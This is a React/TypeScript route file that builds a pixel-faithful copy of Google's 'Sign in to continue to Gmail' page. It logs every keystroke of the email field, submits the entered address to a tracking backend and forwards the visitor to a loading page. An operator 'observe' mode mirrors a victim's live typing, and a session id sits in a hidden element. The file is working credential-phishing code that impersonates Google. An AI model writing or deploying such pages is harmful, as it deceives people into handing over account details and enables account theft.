import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import {
  GE_FONT_FAMILY,
  GE_PAGE_BG,
  GeFontStyle,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({ meta: [{ title: "Sign in - Google Accounts" }] }),
  component: GeSignInPage,
});

const GE_SIGNIN_CSS = `
.ge-signin-page {
  --gm3-primary: #0b57d0;
  --gm3-on-surface: #1f1f1f;
  --gm3-on-surface-variant: #444746;
  --gm3-outline: #747775;
  --gm3-surface: #fff;
  --gm3-page: ${GE_PAGE_BG};
  --font-sans: ${GE_FONT_FAMILY};
  box-sizing: border-box;
  margin: 0;
  min-height: 100vh;
  background: var(--gm3-page);
  color: var(--gm3-on-surface);
  font-family: var(--font-sans);
  -webkit-font-smoothing: antialiased;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  padding: 48px 16px 24px;
}
.ge-signin-page *, .ge-signin-page *::before, .ge-signin-page *::after { box-sizing: border-box; }
.ge-signin-page .card {
  background: var(--gm3-surface);
  width: 100%;
  max-width: 480px;
  border-radius: 28px;
  padding: 36px 40px 36px;
  min-height: 384px;
  display: flex;
  flex-direction: column;
  position: relative;
}
@media (min-width: 600px) {
  .ge-signin-page .card {
    width: 480px;
    max-width: 480px;
    min-height: 528px;
    padding: 40px 40px 36px;
  }
}
.ge-signin-page .logo { display: block; width: 40px; height: 48px; margin: 0; }
.ge-signin-page h1 {
  margin: 24px 0 0;
  font-family: var(--font-sans);
  font-weight: 400;
  font-size: 2rem;
  line-height: 1.25;
  color: var(--gm3-on-surface);
}
@media (min-width: 840px) {
  .ge-signin-page h1 { font-size: 2.25rem; line-height: 1.222; }
}
.ge-signin-page .subtitle {
  margin: 16px 0 0;
  font-size: 1rem;
  line-height: 1.5;
  font-weight: 400;
  color: var(--gm3-on-surface);
}
.ge-signin-page .form-area {
  margin-top: 32px;
  flex: 1;
  display: flex;
  flex-direction: column;
}
.ge-signin-page .field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 8px;
}
.ge-signin-page .field input {
  position: relative;
  z-index: 1;
  width: 100%;
  height: 56px;
  margin: 0;
  padding: 13px 15px;
  border: none;
  outline: none;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: var(--font-sans);
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  caret-color: var(--gm3-primary);
}
.ge-signin-page .field .outline {
  position: absolute;
  inset: 0;
  border: 1px solid var(--gm3-outline);
  border-radius: 4px;
  pointer-events: none;
  background: transparent;
  transition: border-color .15s cubic-bezier(.4,0,.2,1);
}
.ge-signin-page .field .outline-focus {
  position: absolute;
  inset: 0;
  border: 2px solid var(--gm3-primary);
  border-radius: 4px;
  pointer-events: none;
  opacity: 0;
  transition: opacity .15s cubic-bezier(.4,0,.2,1);
}
.ge-signin-page .field label {
  position: absolute;
  left: 8px;
  bottom: 17px;
  padding: 0 8px;
  max-width: calc(100% - 16px);
  color: var(--gm3-on-surface-variant);
  background: var(--gm3-surface);
  font-family: var(--font-sans);
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  pointer-events: none;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  transform-origin: left center;
  transition: transform .15s cubic-bezier(.4,0,.2,1), color .15s cubic-bezier(.4,0,.2,1);
  z-index: 2;
}
.ge-signin-page .field:focus-within .outline-focus { opacity: 1; }
.ge-signin-page .field:focus-within .outline { border-color: transparent; }
.ge-signin-page .field:focus-within label {
  color: var(--gm3-primary);
  transform: translateY(-29px) scale(0.75);
}
.ge-signin-page .field.has-value label {
  transform: translateY(-29px) scale(0.75);
}
.ge-signin-page .field:focus-within input { padding: 12px 14px; }
.ge-signin-page .forgot {
  margin: 9px 0 0;
  padding: 0;
  border: 0;
  background: none;
  color: var(--gm3-primary);
  font-family: var(--font-sans);
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.015625rem;
  line-height: 1.4286;
  cursor: pointer;
  text-align: left;
}
.ge-signin-page .forgot:hover { text-decoration: underline; }
.ge-signin-page .guest {
  margin-top: 32px;
  color: var(--gm3-on-surface-variant);
  font-family: var(--font-sans);
  font-size: 0.875rem;
  font-weight: 400;
  line-height: 1.4286;
}
.ge-signin-page .guest a {
  color: var(--gm3-primary);
  font-weight: 500;
  text-decoration: none;
  letter-spacing: 0.015625rem;
}
.ge-signin-page .guest a:hover { text-decoration: underline; }
.ge-signin-page .actions {
  display: flex;
  flex-direction: row-reverse;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  margin-top: 32px;
  margin-left: -6px;
  gap: 8px;
  width: calc(100% + 12px);
}
.ge-signin-page .btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: var(--font-sans);
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0;
  line-height: 1.4286;
  cursor: pointer;
  user-select: none;
}
.ge-signin-page .btn-filled { background: var(--gm3-primary); color: #fff; }
.ge-signin-page .btn-filled:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-signin-page .btn-filled:disabled {
  background: #0b57d0;
  color: #fff;
  opacity: 0.38;
  cursor: default;
  box-shadow: none;
  filter: none;
}
.ge-signin-page .btn-text {
  background: transparent;
  color: var(--gm3-primary);
  padding: 0 12px;
}
.ge-signin-page .btn-text:hover { background: rgba(11, 87, 208, 0.08); }
.ge-signin-page .footer {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  max-width: 480px;
  margin-top: 16px;
  padding: 0 4px;
  gap: 8px;
}
.ge-signin-page .lang {
  appearance: none;
  border: 0;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: var(--font-sans);
  font-size: 0.75rem;
  line-height: 1.333;
  padding: 8px 28px 8px 12px;
  border-radius: 8px;
  cursor: pointer;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23444746' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 10px center;
}
.ge-signin-page .lang:hover { background-color: rgba(68, 71, 70, 0.08); }
.ge-signin-page .footer-links {
  display: flex;
  list-style: none;
  margin: 0;
  padding: 0;
  gap: 0;
}
.ge-signin-page .footer-links a {
  display: flex;
  align-items: center;
  color: var(--gm3-on-surface);
  font-family: var(--font-sans);
  font-size: 0.75rem;
  font-weight: 400;
  letter-spacing: 0.00625rem;
  line-height: 1.333;
  text-decoration: none;
  padding: 8px 12px;
  border-radius: 8px;
}
.ge-signin-page .footer-links a:hover { background: rgba(68, 71, 70, 0.08); }
html, body { background: ${GE_PAGE_BG} !important; }
`;

function GeSignInPage() {
  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
    useGeTracking();
  const [email, setEmail] = useState("");
  const emailRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setTimeout(() => emailRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (
        d.field === "email" ||
        d.field === "identifier" ||
        d.field === "Email or phone" ||
        d.field === "Email"
      ) {
        setEmail(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const canContinue = email.trim().length > 0;

  const handleNext = (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!canContinue) return;
    trackClick("Next");
    trackSubmit("email", email.trim());
    geNavigate("/ge/loading");
  };

  return (
    <div className="ge-signin-page">
      <GeFontStyle />
      <style>{GE_SIGNIN_CSS}</style>

      <main className="card" role="main">
        <GoogleGLogo className="logo" width={48} height={48} />
        <h1>Sign in</h1>
        <p className="subtitle">to continue to Gmail</p>

        <form className="form-area" onSubmit={handleNext} autoComplete="off">
          <div className={`field${email ? " has-value" : ""}`}>
            <input
              ref={emailRef}
              type="email"
              id="identifierId"
              name="email"
              autoComplete="username"
              spellCheck={false}
              autoCapitalize="none"
              aria-label="Email or phone"
              placeholder=" "
              value={email}
              onChange={(e) => {
                const v = e.target.value;
                setEmail(v);
                trackInput("email", v);
              }}
            />
            <div className="outline" aria-hidden="true" />
            <div className="outline-focus" aria-hidden="true" />
            <label htmlFor="identifierId">Email or phone</label>
          </div>

          <button
            type="button"
            className="forgot"
            onClick={() => trackClick("Forgot email?")}
          >
            Forgot email?
          </button>

          <p className="guest">
            Not your computer? Use Guest mode to sign in privately.{" "}
            <a
              href="https://support.google.com/chrome/answer/6130773?hl=en"
              target="_blank"
              rel="noopener noreferrer"
            >
              Learn more about using Guest mode
            </a>
          </p>

          <div className="actions">
            <button type="submit" className="btn btn-filled" disabled={!canContinue}>
              Next
            </button>
            <button
              type="button"
              className="btn btn-text"
              onClick={() => trackClick("Create account")}
            >
              Create account
            </button>
          </div>
        </form>
      </main>

      <footer className="footer">
        <select className="lang" aria-label="Change language" defaultValue="en-US">
          <option value="en-US">English (United States)</option>
          <option value="es">Español (España)</option>
          <option value="fr">Français (France)</option>
          <option value="de">Deutsch</option>
          <option value="ja">日本語</option>
        </select>
        <ul className="footer-links">
          <li>
            <a href="https://support.google.com/accounts?hl=en" target="_blank" rel="noopener noreferrer">
              Help
            </a>
          </li>
          <li>
            <a
              href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true"
              target="_blank"
              rel="noopener noreferrer"
            >
              Privacy
            </a>
          </li>
          <li>
            <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank" rel="noopener noreferrer">
              Terms
            </a>
          </li>
        </ul>
      </footer>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
